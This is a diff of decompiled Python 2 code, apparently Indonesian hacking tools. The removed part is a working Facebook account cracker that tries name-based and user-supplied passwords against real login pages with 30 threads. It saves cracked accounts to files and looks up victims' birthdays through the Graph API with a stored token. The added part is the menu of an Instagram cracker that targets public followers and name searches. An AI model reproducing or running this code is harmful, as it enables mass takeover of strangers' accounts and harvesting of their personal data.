-    ask = raw_input(' \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n \xe2\x95\x91  Password Manual? [Y/t]   \xe2\x95\x91\n \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    if ask == 'Y' or ask == 'y':
-        manualfreefb()
-    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
-    print ''
-    def main(arg):
-        global loop
-        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
-        sys.stdout.flush()
-        user = arg
-        uid, name = user.split('|')
-        try:
-            os.mkdir('out')
-        except OSError:
-            pass
-        try:
-            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
-                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas})
-                xo = rex.content
-                if 'free_logout_button' in xo or 'save-device' in xo:
-                    print '\r\x1b[1;92m  [LIVE] ' + uid + '|' + pw + '                                            '
-                    ok.append(uid + '|' + pw)
-                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
-                    save.write(' [OK] ' + str(uid) + '|' + str(pw) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-                elif 'checkpoint' in xo:
-                    try:
-                        token = open('login.txt').read()
-                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
-                        b = json.loads(sw.text)
-                        graph = b['birthday']
-                        month, day, year = graph.split('/')
-                        month = bulan[month]
-                        print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
-                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
-                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-                        save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
-                        save.close()
-                        break
-                    except (KeyError, IOError):
-                        graph = ' '
-                    except:
-                        pass
-                    print '\r\x1b[1;93m  [CHECKPOINT] ' + uid + '|' + pw + '                        '
-                    cp.append(uid + '|' + pw)
-                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
-                    save.write('  [CHECKPOINT] ' + str(uid) + '|' + str(pw) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-            loop += 1
-        except:
-            pass
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
-    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
-    exit()
-def manualfreefb():
-    print '\n [\xe2\x80\xa2] Contoh Password : bismillah,sayang,rahasia'
-    pw = raw_input(' [?] Password : ').split(',')
-    if len(pw) == 0:
-        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
-    print '\n [!] Aktifkan Mode Pesawat Jika Tidak Ada Hasil'
-    print ''
-    def main(arg):
-        global loop
-        print '\r\x1b[1;97m [\xc3\x97] [CRACK] %s/%s \x1b[0;32mLIVE-:%s - \x1b[0;33mCHECHPOINT-:%s ' % (loop, len(id), len(ok), len(cp)),
-        sys.stdout.flush()
-        user = arg
-        uid, name = user.split('|')
-        try:
-            os.mkdir('out')
-        except OSError:
-            pass
-        try:
-            for asu in pw:
-                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas})
-                xo = rex.content
-                if 'free_logout_button' in xo or 'save-device' in xo:
-                    print '\r\x1b[1;92m. *--> ' + uid + '|' + asu + '                          '
-                    ok.append(uid + '|' + asu)
-                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
-                    save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-                elif 'checkpoint' in xo:
-                    try:
-                        token = open('login.txt').read()
-                        sw = requests.get('https://graph.facebook.com/' + uid + '/?access_token=' + token)
-                        b = json.loads(sw.text)
-                        graph = b['birthday']
-                        month, day, year = graph.split('/')
-                        month = bulan[month]
-                        print '\r\x1b[1;93m  CHECKPOINT ' + uid + '|' + asu + '|' + day + ' ' + month + ' ' + year + ' '
-                        cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
-                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
-                        save.write('  CHECKPOINT ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
-                        save.close()
-                        break
-                    except (KeyError, IOError):
-                        graph = ' '
-                    except:
-                        pass
-                    print '\r\x1b[1;93m  CHECKPOINT ' + uid + '|' + asu + '                        '
-                    cp.append(uid + '|' + asu)
-                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
-                    save.write('  CHECKPOINT ' + str(uid) + '|' + str(asu) + '\n')
-                    save.close()
-                    break
-                    continue
-                    continue
-            loop += 1
-        except:
-            pass
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\n\n\x1b[1;97m [\xe2\x80\xa2] Selesai...'
-    print '\x1b[1;96m [\xe2\x80\xa2] Script : Muhammad Dicky Wahyudi Ganteng-XD'
-    exit()
+        print m + ' Choose Correct....'
+
+
+def menu_dev():
+    pil_kon = []
+    print '\n'
+    belum_premium = a + ' [' + p + '@' + a + '] ' + m + 'SYaM King\xca\x98\xe2\x80\xbf\xca\x98'
+    print banner
+    print k + ' >_' + h + ' Author:' + k + ' SYaM'
+    print k + ' >_' + h + ' Coding:' + k + ' Python2'
+    print versi
+    try:
+        if followerz == followerzz:
+            try:
+                tgl = datetime.datetime.now()
+                bln = tgl.month
+                thn = tgl.year
+                day = tgl.day
+                mulai = datetime.date(int(wak_[0]), int(wak_[1]), int(wak_[2]))
+                seles = datetime.date(thn, bln, day)
+                sisa = mulai - seles
+                lim_dev_id = str(sisa).split()[0]
+                if 'U' in fol_dev:
+                    print a + ' [' + k + '@' + a + '] ' + h + 'Premium: ' + p + 'Unlimited'
+                else:
+                    print a + ' [' + k + '@' + a + '] ' + h + 'Premium: ' + k + lim_dev_id + ' ' + p + 'Day again'
+                    if ':' in str(lim_dev_id) or '-' in str(lim_dev_id):
+                        hapus_cokiz()
+                        print ' You have exceeded the usage limit\n Connect To Admin'
+                        pil_kon.append('IqbalDev')
+            except:
+                hapus_cokiz()
+
+        else:
+            print belum_premium
+    except:
+        print belum_premium
+
+    print garis
+    print a + ' [' + k + '1' + a + '] ' + p + 'Crack From Public Follower'
+    print a + ' [' + k + '2' + a + '] ' + p + 'Crack From Search Name'
+    print a + ' [' + k + '3' + a + '] ' + p + 'Check Results' + h + ' OK' + a + '/' + k + 'CP'
+    print a + ' [' + k + '4' + a + '] ' + p + 'Log Out Instagram Account'
+    print garis
+    pil = raw_input('[?] Choose : ')
+    pilihan(pil)
+
+
+_uyuk_()
+banner = '\n _______           _______  _______   \n(  ____ \\|\\     /|(  ___  )(       )  \n| (    \\/( \\   / )| (   ) || () () |  \n| (_____  \\ (_) / | (___) || || || |  \n(_____  )  \\   /  |  ___  || |(_)| |  \n      ) |   ) (   | (   ) || |   | |  \n/\\____) |   | |   | )   ( || )   ( |  \n\\_______)   \\_/   |/     \\||/     \\|  \n                                      '
+versi = k + ' >_' + h + ' Version_:' + p + ' 0.1\n'
 if __name__ == '__main__':
-    os.system('clear')
-    login()
-# Mau Ngapain Cuk?
+    cek_login()
+    menu_dev()
+# okay decompiling enc.pyc
